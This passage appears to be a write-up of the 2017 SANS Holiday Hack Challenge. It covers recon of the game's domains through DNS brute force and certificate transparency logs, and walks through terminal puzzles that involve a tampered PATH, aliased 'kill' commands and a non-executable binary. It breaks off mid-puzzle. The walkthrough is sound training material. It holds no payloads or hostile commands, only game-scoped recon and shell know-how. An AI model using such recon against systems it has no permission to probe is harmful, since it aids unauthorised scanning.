|   DNS Brute-force hostnames:
|     emi.northpolechristmastown.com - 35.185.57.190
|_    ewa.northpolechristmastown.com - 35.185.115.185
</pre>
</div>
</div>

<div id="outline-container-org0658621" class="outline-3">
<h3 id="org0658621">Certificate Transparency Logs</h3>
<div class="outline-text-3" id="text-org0658621">
<p>
Next, let's turn our attention to the holidayhackchallenge.com
domain. Last year, there were some new hosts that appeared under this
domain (e.g. quest2016.holidayhackchallenge.com). Brute-forcing this
will likely not get us very far, so let's try a different approach:
certificate transparency logs. Many certificate authorities maintain
transparency systems, so that issued certificates can be publicly
reviewd. Symantec, for instance, has a free tool that will search the
logs of several certificate authorities:
</p>


<div class="figure">
<p><img src="./images/recon_crypto_report.png" alt="recon_crypto_report.png" />
</p>
<p><span class="figure-number">Figure 3: </span>Symantec Crypto Report for holidayhackchallenge.com</p>
</div>

<p>
Searching for holidayhackchallenge.com reveals the following
certificates that don't look familiar:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-right" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Common Name</th>
<th scope="col" class="org-left">Subject Alternate Names (SANs)</th>
<th scope="col" class="org-right">IP</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">2017.holidayhackchallenge.com</td>
<td class="org-left">2017, puzzler2017</td>
<td class="org-right">35.196.67.150</td>
</tr>

<tr>
<td class="org-left">docker2017.holidayhackchallenge.com</td>
<td class="org-left">&#xa0;</td>
<td class="org-right">35.190.163.207</td>
</tr>

<tr>
<td class="org-left">chat.holidayhackchallenge.com</td>
<td class="org-left">&#xa0;</td>
<td class="org-right">35.196.73.180</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org3002524" class="outline-3">
<h3 id="org3002524">Monitoring</h3>
<div class="outline-text-3" id="text-org3002524">
<p>
None of the 3 servers listed above are currently accessible on port 80
or 443 (HTTP and HTTPS). We setup some monitoring using a free online
service (uptimerobot.com). Every 5 minutes, it would try to connect to
HTTP and HTTPs on the 3 servers listed above. Once the systems become
available, it will text us and post a message to our Slack channel.
</p>

<p>
Once that happens, the hack is on, and we'll be ready to hit the
ground running.
</p>
</div>
</div>

<div id="outline-container-orgb1d0f1d" class="outline-3">
<h3 id="orgb1d0f1d">And Then Things Changed&#x2026;</h3>
<div class="outline-text-3" id="text-orgb1d0f1d">
<p>
On December 11th, this setup was changed, and a lot of hosts were
removed from DNS. We believe that the systems were reconfigured to
only be accessible from private IP space.
</p>

<p>
The systems where the configuration changed are marked in italics in the table below.
</p>
</div>
</div>

<div id="outline-container-org257f225" class="outline-3">
<h3 id="org257f225">Recon Summary</h3>
<div class="outline-text-3" id="text-org257f225">
<p>
We can use the following indicators to search any clues we're later provided with:
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Indicator</th>
<th scope="col" class="org-left">Type</th>
<th scope="col" class="org-left">Source</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">northpolechristmastown.com</td>
<td class="org-left">Domain</td>
<td class="org-left">Reverse WHOIS</td>
</tr>

<tr>
<td class="org-left">holidayhackchallenge.com</td>
<td class="org-left">Domain</td>
<td class="org-left">2016 Hack</td>
</tr>

<tr>
<td class="org-left">nppd.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Google Search</td>
</tr>

<tr>
<td class="org-left"><i>intranet.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>files.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">dev.northpolechristmastown.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>admin.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>mail.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>emi.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left"><i>ewa.northpolechristmastown.com</i></td>
<td class="org-left">FQDN</td>
<td class="org-left">DNS Brute Force</td>
</tr>

<tr>
<td class="org-left">2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">puzzler2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert SAN</td>
</tr>

<tr>
<td class="org-left">docker2017.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">chat.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">35.185.43.23</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (files)</td>
</tr>

<tr>
<td class="org-left">35.185.57.190</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (emi)</td>
</tr>

<tr>
<td class="org-left">35.185.84.51</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (dev)</td>
</tr>

<tr>
<td class="org-left">35.185.115.185</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (admin, mail, ewa)</td>
</tr>

<tr>
<td class="org-left">35.190.163.207</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (docker2017)</td>
</tr>

<tr>
<td class="org-left">35.196.67.150</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (2017)</td>
</tr>

<tr>
<td class="org-left">35.196.73.18</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (chat)</td>
</tr>

<tr>
<td class="org-left">35.196.239.128</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (intranet)</td>
</tr>

<tr>
<td class="org-left">HK-47 (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Artoo (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Threepio (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Sand-Crawler (Star Wars Vehicle)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">North Pole Police Department</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>

<tr>
<td class="org-left">Cindy Lou Who (2015 Hack)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>

<tr>
<td class="org-left">Dr. Who (2016 Hack)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>
</tbody>
</table>


<div class="figure">
<p><img src="./images/game_is_live.png" alt="game_is_live.png" width="600px" />
</p>
<p><span class="figure-number">Figure 4: </span>Slack Notification that the Game is Live!</p>
</div>
</div>
</div>
</div>


<div id="outline-container-org97daad7" class="outline-2">
<h2 id="org97daad7">Terminals</h2>
<div class="outline-text-2" id="text-org97daad7">
</div>
<div id="outline-container-orge72055a" class="outline-3">
<h3 id="orge72055a">Winter Wonder Landing</h3>
<div class="outline-text-3" id="text-orge72055a">
</div>
<div id="outline-container-orgbe204a1" class="outline-4">
<h4 id="landing_question"><a id="orgbe204a1"></a>Question</h4>
<div class="outline-text-4" id="text-landing_question">
<pre class="example">
                                 |
                               \ ' /
                             -- (*) --
                                &gt;*&lt;
                               &gt;0&lt;@&lt;
                              &gt;&gt;&gt;@&lt;&lt;*
                             &gt;@&gt;*&lt;0&lt;&lt;&lt;
                            &gt;*&gt;&gt;@&lt;&lt;&lt;@&lt;&lt;
                           &gt;@&gt;&gt;0&lt;&lt;&lt;*&lt;&lt;@&lt;
                          &gt;*&gt;&gt;0&lt;&lt;@&lt;&lt;&lt;@&lt;&lt;&lt;
                         &gt;@&gt;&gt;*&lt;&lt;@&lt;&gt;*&lt;&lt;0&lt;*&lt;
           \*/          &gt;0&gt;&gt;*&lt;&lt;@&lt;&gt;0&gt;&lt;&lt;*&lt;@&lt;&lt;
       ___\\U//___     &gt;*&gt;&gt;@&gt;&lt;0&lt;&lt;*&gt;&gt;@&gt;&lt;*&lt;0&lt;&lt;
       |\\ | | \\|    &gt;@&gt;&gt;0&lt;*&lt;0&gt;&gt;@&lt;&lt;0&lt;&lt;&lt;*&lt;@&lt;&lt;  
       | \\| | _(UU)_ &gt;((*))_&gt;0&gt;&lt;*&lt;0&gt;&lt;@&lt;&lt;&lt;0&lt;*&lt;
       |\ \| || / //||.*.*.*.|&gt;&gt;@&lt;&lt;*&lt;&lt;@&gt;&gt;&lt;0&lt;&lt;&lt;
       |\\_|_|&amp;&amp;_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|&gt;&gt;&gt;&gt;&gt;&gt;|
           ~~~~~~~~         '""""`------'

My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?


Find and run the elftalkd binary to complete this challenge.
</pre>
</div>
</div>

<div id="outline-container-orgd923b10" class="outline-4">
<h4 id="landing_how-to-find-the-terminal"><a id="orgd923b10"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-landing_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54</a>
</p>

<p>
Direct Link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/VLTddXMbcgw?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-landing.png" alt="terminal-location-landing.png" />
</p>
<p><span class="figure-number">Figure 5: </span>The terminal is right on top of the tower.</p>
</div>
</div>
</div>

<div id="outline-container-org9eb4d4e" class="outline-4">
<h4 id="landing_background-information"><a id="org9eb4d4e"></a>Background Information</h4>
<div class="outline-text-4" id="text-landing_background-information">
<p>
We are logged in as the user <code>elf</code>. According to Bushy Green's Twitter account someone copied the wrong <code>find</code> executable onto his system.
</p>
</div>
</div>

<div id="outline-container-orgb8e7444" class="outline-4">
<h4 id="landing_goal"><a id="orgb8e7444"></a>Goal</h4>
<div class="outline-text-4" id="text-landing_goal">
<p>
According to the <abbr title="Message of the Day"> MOTD</abbr> we need to find and run the <code>elftalkd</code> binary.
</p>
</div>
</div>

<div id="outline-container-org40e4e5d" class="outline-4">
<h4 id="landing_hints"><a id="org40e4e5d"></a>Hints</h4>
<div class="outline-text-4" id="text-landing_hints">
<p>
Bushy Evergreen on Twitter has a hint:
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Ugh, somebody copied over the wrong `find` executable to my system today. How am I supposed to know where find normally is?!</p>&mdash; Bushy Evergreen (@GreenestElf) <a href="https://twitter.com/GreenestElf/status/938165130906365952?ref_src=twsrc%5Etfw">December 5, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-org9cba5b1" class="outline-4">
<h4 id="landing_approach"><a id="org9cba5b1"></a>Approach</h4>
<div class="outline-text-4" id="text-landing_approach">
<p>
To solve this challenge we need to find a valid version of <code>find</code> on the system or some other viable version to find the <code>elftalkd</code> binary.
</p>
</div>
</div>

<div id="outline-container-org097446e" class="outline-4">
<h4 id="landing_solution"><a id="org097446e"></a>Solution</h4>
<div class="outline-text-4" id="text-landing_solution">
<p>
First we need to test what's wrong with <code>find</code>.
</p>

<pre class="example">
elf@784e43534178:~$ find
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
</pre>

<p>
It looks like <code>find</code> is located in <code>/usr/local/bin/find</code>.
<code>find</code> is a standard UNIX utility and is not normally located in /usr/local so this output is unexpected.
Let's look at our PATH variable that identifies the order that executables are located in.
</p>

<pre class="example">
elf@784e43534178:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
</pre>

<p>
<code>/usr/local/bin</code> is prioritized before <code>/usr/bin</code>. Let's see if find exists in the normal <code>/usr/bin</code> location.
</p>

<pre class="example">
elf@784e43534178:~$ ls -al /usr/bin/find
-rwxr-xr-x 1 root root 221768 Feb  7  2016 /usr/bin/find
</pre>

<p>
The original <code>find</code> is still there. We can use it to find the <code>elftalkd</code> binary and execute it.
</p>

<pre class="example">
elf@784e43534178:~$ /usr/bin/find / -iname elftalkd            
/usr/bin/find: '/var/cache/ldconfig': Permission denied
/usr/bin/find: '/var/cache/apt/archives/partial': Permission denied
/usr/bin/find: '/var/lib/apt/lists/partial': Permission denied
/run/elftalk/bin/elftalkd
/usr/bin/find: '/proc/tty/driver': Permission denied
/usr/bin/find: '/root': Permission denied
elf@784e43534178:~$ /run/elftalk/bin/elftalkd

	Running in interactive mode

	--== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...


--== Initialization Complete ==--

      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ \ |  _| __/ _` | | |/ / _` |
|  __/ | | | || (_| | |   &lt; (_| |
 \___|_|_|  \__\__,_|_|_|\_\__,_|

-*&gt; elftalkd! &lt;*-
Version 9000.1 (Build 31337) 
By Santa Claus &amp; The Elf Team
Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
LANG=en_US.UTF-8
Timezone=UTC

Commencing Elf Talk Daemon (pid=6021)... done!
Background daemon...
</pre>
</div>
</div>

<div id="outline-container-org3124dfd" class="outline-4">
<h4 id="landing_alternatives"><a id="org3124dfd"></a>Alternatives</h4>
<div class="outline-text-4" id="text-landing_alternatives">
<p>
The quick method is to iterate through using wildcards to execute the binary.
</p>

<pre class="example">
elf@784e43534178:~$ /elftalkd
bash: /elftalkd: No such file or directory
elf@784e43534178:~$ /*/elftalkd
bash: /*/elftalkd: No such file or directory
elf@784e43534178:~$ /*/*/elftalkd
bash: /*/*/elftalkd: No such file or directory
elf@784e43534178:~$ /*/*/*/elftalkd

	Running in interactive mode

	--== Initializing elftalkd ==--
Initializing Messaging System!
...
</pre>

<p>
This can also be further simplified by using the relatively new bash option <code>globstar</code>.
According to the documentation, "If set, the pattern '**' used in a filename
expansion context will match all files and zero or more directories and
subdirectories. If the pattern is followed by a ‘/’, only directories and
subdirectories match."  With this option enabled, we only need a single attempt to find
and execute the binary:
</p>

<pre class="example">
elf@784e43534178:~$ shopt -s globstar
elf@784e43534178:~$ /**/elftalkd
	Running in interactive mode
	--== Initializing elftalkd ==--
Initializing Messaging System!
...
</pre>
</div>
</div>
</div>
<div id="outline-container-org8d97bf6" class="outline-3">
<h3 id="org8d97bf6">Winconceivable The Cliffs Of Insanity</h3>
<div class="outline-text-3" id="text-org8d97bf6">
</div>
<div id="outline-container-org967358c" class="outline-4">
<h4 id="cliffs_question"><a id="org967358c"></a>Question</h4>
<div class="outline-text-4" id="text-cliffs_question">
<pre class="example">
                ___,@
               /  &lt;
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/


My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.


Kill the "santaslittlehelperd" process to complete this challenge.
</pre>
</div>
</div>

<div id="outline-container-org83b739e" class="outline-4">
<h4 id="cliffs_how-to-find-the-terminal"><a id="org83b739e"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-cliffs_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/LLCUtyC1p2A?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-cliffs.png" alt="terminal-location-cliffs.png" />
</p>
<p><span class="figure-number">Figure 6: </span>The terminal is on top of the building on the floating island right up front.</p>
</div>
</div>
</div>

<div id="outline-container-orgfd658bd" class="outline-4">
<h4 id="cliffs_background-information"><a id="orgfd658bd"></a>Background Information</h4>
<div class="outline-text-4" id="text-cliffs_background-information">
<pre class="example">
elf@784e43534178:~$ D="------"; echo "$D System info:"; uname -a; cat /etc/issue; echo "$D Differences from skeleton home directory:"; diff -r /etc/skel .; echo "$D Who am I?"; id; echo "$D Running procs:"; ps axf
------ System info:
Linux 784e43534178 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux
Ubuntu 16.04.3 LTS \n \l
------ Differences from skeleton home directory:
diff -r /etc/skel/.bashrc ./.bashrc
81c81,84
&lt; 
---
&gt;     alias kill='true'
&gt;     alias killall='true'
&gt;     alias pkill='true'
&gt;     alias skill='true'
117a121,122
&gt; PATH=$PATH:/usr/games
&gt; cat /etc/motd
------ Who am I?
uid=1000(elf) gid=1000(elf) groups=1000(elf)
------ Running procs:
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:01  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  994 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
We see that <code>/usr/bin/santaslittlehelperd</code> is running, and we're told
that we need to kill it. However, we see that in our <code>.bashrc</code> file,
<code>kill</code> and its variants are aliased to <code>true</code>, which has no effect.
</p>
</div>
</div>

<div id="outline-container-org26fc139" class="outline-4">
<h4 id="cliffs_goal"><a id="org26fc139"></a>Goal</h4>
<div class="outline-text-4" id="text-cliffs_goal">
<p>
We need to <code>kill santaslittlehelperd</code>, but our <code>kill</code> has been turned ineffective.
</p>
</div>
</div>

<div id="outline-container-org852fcb6" class="outline-4">
<h4 id="cliffs_hints"><a id="org852fcb6"></a>Hints</h4>
<div class="outline-text-4" id="text-cliffs_hints">
<p>
Sparkle Redberry on Twitter has some hints:
</p>

<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Dear <a href="https://twitter.com/hashtag/lazyweb?src=hash&amp;ref_src=twsrc%5Etfw">#lazyweb</a>: How do I fix a malicious alias on my Linux box? It seems to be stopping me from killing processes...</p>&mdash; Sparkle Redberry (@GlitteryElf) <a href="https://twitter.com/GlitteryElf/status/938539753372237824?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">I tried `man alias`, but that doesn&#39;t even exist. It looks like maybe it&#39;s a built-in to bash itself?</p>&mdash; Sparkle Redberry (@GlitteryElf) <a href="https://twitter.com/GlitteryElf/status/938540163726061568?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Update: I read into `man bash`, and I even found a section on ALIASES (starting with &quot;Aliases allow a string to be substituted for a word when it is used as the first word of a simple command[...]&quot; but I couldn&#39;t even make it 40 words in before I got all cross-eyed.</p>&mdash; Sparkle Redberry (@GlitteryElf) <a href="https://twitter.com/GlitteryElf/status/938540426088214528?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>
</div>
</div>

<div id="outline-container-org77ad7fa" class="outline-4">
<h4 id="cliffs_approach"><a id="org77ad7fa"></a>Approach</h4>
<div class="outline-text-4" id="text-cliffs_approach">
<p>
From the <a href="http://tldp.org/LDP/abs/html/aliases.html">Bash documentation</a>:
</p>

<blockquote>
<p>
A Bash alias is essentially nothing more than a keyboard shortcut, an abbreviation, a means of avoiding typing a long command sequence.
</p>
</blockquote>

<p>
Here, however, aliases have been used to effectively disable <code>kill</code>
and its brethren. We need to figure out a way to run the real version
of <code>kill</code> instead of the aliased version. One way to do this is to use the <code>which</code> command:
</p>

<pre class="example">
elf@784e43534178:~$ which kill
/bin/kill
</pre>

<p>
Using the full path to the binary will bypass the alias, and allow us to actually run <code>kill</code>.
</p>

<pre class="example">
elf@784e43534178:~$ /bin/kill -h
Usage:
 kill [options] &lt;pid&gt; [...]
Options:
 &lt;pid&gt; [...]            send signal to every &lt;pid&gt; listed
 -&lt;signal&gt;, -s, --signal &lt;signal&gt;
			specify the &lt;signal&gt; to be sent
 -l, --list=[&lt;signal&gt;]  list all signal names, or convert one to a name
 -L, --table            list all signal names in a nice table
 -h, --help     display this help and exit
 -V, --version  output version information and exit
For more details see kill(1).
</pre>

<p>
All that's left is to determine the process ID (<code>pid</code>) of the process to be killed. We can use the <code>ps</code> command to determine this:
</p>

<pre class="example">
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:01  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
  649 pts/0    R+     0:00  \_ ps axf
elf@784e43534178:~$ /bin/kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
  658 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
Santa's little helper is no more.
</p>
</div>
</div>

<div id="outline-container-orgc36cef6" class="outline-4">
<h4 id="cliffs_solution"><a id="orgc36cef6"></a>Solution</h4>
<div class="outline-text-4" id="text-cliffs_solution">
<p>
A one-liner is: <code>/usr/bin/pkill -f santaslittlehelperd</code>. <code>pkill</code> can
kill a process by name, and the <code>-f</code> argument will have it match
against the full name of the process.
</p>
</div>
</div>

<div id="outline-container-org8bc91fd" class="outline-4">
<h4 id="cliffs_alternatives"><a id="org8bc91fd"></a>Alternatives</h4>
<div class="outline-text-4" id="text-cliffs_alternatives">
<p>
Another approach is simply to remove the alias, by using the <code>unalias</code> command:
</p>

<pre class="example">
elf@784e43534178:~$ unalias kill
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
    8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
   11 pts/0    S      0:00 /sbin/kworker
   18 pts/0    S      0:00  \_ /sbin/kworker
   12 pts/0    S      0:00 /bin/bash
   31 pts/0    R+     0:00  \_ ps axf
elf@784e43534178:~$ kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
Alternatively, you could run <code>bash</code> with the <code>--norc</code> flag, which
prevents it from reading and executing the <code>~/.bashrc</code> file where the
aliases are added.
</p>

<p>
One more approach is to call the command you want with a backslash.
</p>

<pre class="example">
elf@784e43534178:~$ \kill 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  \_ ps axf
</pre>

<p>
Or call the command in quotes.
</p>

<pre class="example">
elf@784e43534178:~$ "kill" 8
elf@784e43534178:~$ ps axf
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   12 pts/0    S      0:00 /bin/bash
   36 pts/0    R+     0:00  \_ ps axf
</pre>
</div>
</div>

<div id="outline-container-orgf5b6390" class="outline-4">
<h4 id="cliffs_common-pitfalls"><a id="orgf5b6390"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-cliffs_common-pitfalls">
<p>
The fact that <code>kill</code> was aliased to <code>true</code> was problematic, because
<code>true</code> never returns any output. Thus, it would look like the <code>kill</code>
command worked, but the process would still be running. Running
something like <code>kill -h</code> would reveal that <code>kill</code> was not being run
correctly, since the help output would not be displayed.
</p>
</div>
</div>
</div>
<div id="outline-container-org0d9f0bd" class="outline-3">
<h3 id="org0d9f0bd">Cryokinetic Magic</h3>
<div class="outline-text-3" id="text-org0d9f0bd">
</div>
<div id="outline-container-orge8572cf" class="outline-4">
<h4 id="cryokinetic_question"><a id="orge8572cf"></a>Question</h4>
<div class="outline-text-4" id="text-cryokinetic_question">
<pre class="example">
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`

My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.


Run the CandyCaneStriper executable to complete this challenge.
</pre>
</div>
</div>

<div id="outline-container-orge6ab40a" class="outline-4">
<h4 id="cryokinetic_how-to-find-the-terminal"><a id="orge6ab40a"></a>How to find the terminal</h4>
<div class="outline-text-4" id="text-cryokinetic_how-to-find-the-terminal">
<p>
From this game: <a href="https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02">https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02</a>
</p>

<p>
Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&amp;uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&amp;uid=USER_ID</a>
</p>

<div class="org-center">
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/p6m3N1SVvNs?rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
</div>


<div class="figure">
<p><img src="./images/terminal-location-cryokinetic.png" alt="terminal-location-cryokinetic.png" />
</p>
<p><span class="figure-number">Figure 7: </span>The terminal is on top of the ice shanty.</p>
</div>
</div>
</div>

<div id="outline-container-org72df484" class="outline-4">
<h4 id="cryokinetic_background-information"><a id="org72df484"></a>Background Information</h4>
<div class="outline-text-4" id="text-cryokinetic_background-information">
<p>
Upon initial inspection we discover that <code>/usr/bin/chmod</code> is empty and <code>CandyCaneStriper</code> has no execution flags set.
</p>
</div>
</div>

<div id="outline-container-org17c2e0d" class="outline-4">
<h4 id="cryokinetic_goal"><a id="org17c2e0d"></a>Goal</h4>
<div class="outline-text-4" id="text-cryokinetic_goal">
<p>
We need to run the <code>CandyCaneStriper</code> program, but we can't use the <code>chmod</code> binary.
</p>
</div>
</div>

<div id="outline-container-org8e8afe5" class="outline-4">
<h4 id="cryokinetic_hints"><a id="org8e8afe5"></a>Hints</h4>
<div class="outline-text-4" id="text-cryokinetic_hints">
<p>
<a href="https://twitter.com/GreenesterElf">Holly Evergreen on Twitter has a hint</a>
</p>
<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">Update: LD_PRELOAD is awesome, but it doesn&#39;t help in this situation. <a href="https://t.co/gkF690pdAJ">https://t.co/gkF690pdAJ</a> looks like the right approach, but it&#39;s not working on this system for some reason. Ugh, I step away from this for a bit and check with others. I&#39;m too frustrated.</p>&mdash; Holly Evergreen (@GreenesterElf) <a href="https://twitter.com/GreenesterElf/status/938544194070634496?ref_src=twsrc%5Etfw">December 6, 2017</a></blockquote>

<p>
Following the link describes a familiar situation:
</p>

<blockquote>
<p>
Is there a way to run an executable binary file under Linux which does not have the execute bit set?  chmod +x is not an option.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-org33affdb" class="outline-4">
<h4 id="cryokinetic_approach"><a id="org33affdb"></a>Approach</h4>
<div class="outline-text-4" id="text-cryokinetic_approach">
<p>
Let's take a look at the executable we're dealing with:
</p>

<pre class="example">
elf@784e43534178:~$ ls -l CandyCaneStriper 
